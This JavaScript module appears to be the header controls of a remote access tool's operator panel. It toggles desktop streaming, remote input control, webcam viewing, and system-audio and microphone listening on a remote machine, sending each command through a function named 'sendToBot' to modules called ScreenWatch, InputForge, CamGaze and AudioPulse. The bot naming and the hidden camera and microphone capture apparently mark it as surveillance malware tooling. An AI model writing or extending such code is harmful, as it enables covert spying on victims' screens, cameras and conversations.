/* frontend/client_control/js/modules/ui/header.js */
import { AppState } from '../core/states.js';

export function initHeaderControls() {
    const actions = [
        { id: 'btn-desktop-stream',  ref: AppState.desktop, key: 'observe', mod: 'ScreenWatch', cmds: ['start_stream', 'stop_stream'] },
        { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'InputForge',  cmds: ['start_control', 'stop_control'] },
        { id: 'btn-webcam-stream',   ref: AppState.webcam,  key: 'active',  mod: 'CamGaze',     cmds: ['start', 'stop'] },
        { id: 'btn-audio-pc',        ref: AppState.audio,   key: 'output',  mod: 'AudioPulse',  cmds: ['listen_pc_on', 'listen_pc_off'] },
        { id: 'btn-audio-mic',       ref: AppState.audio,   key: 'input',   mod: 'AudioPulse',  cmds: ['listen_mic_on', 'listen_mic_off'] }
    ];

    const toggleAction = (action, forceState = null) => {
        const { id, ref, key, mod, cmds } = action;
        const btn = document.getElementById(id);

        ref[key] = (forceState !== null) ? forceState : !ref[key];
        btn?.classList.toggle('active', ref[key]);

        if (window.sendToBot) {
            window.sendToBot(mod, ref[key] ? cmds[0] : cmds[1]);
        }
    };

    actions.forEach(a => {
        const el = document.getElementById(a.id);
        if (el) el.onclick = () => toggleAction(a);
    });

    window.syncModeResources = (mode) => {
        if (mode === 'webcam') {
            if (AppState.desktop.observe) toggleAction(actions[0], false);
            if (AppState.desktop.control) toggleAction(actions[1], false);
        } else if (mode === 'desktop') {
            if (AppState.webcam.active) toggleAction(actions[2], false);
        }
    };
}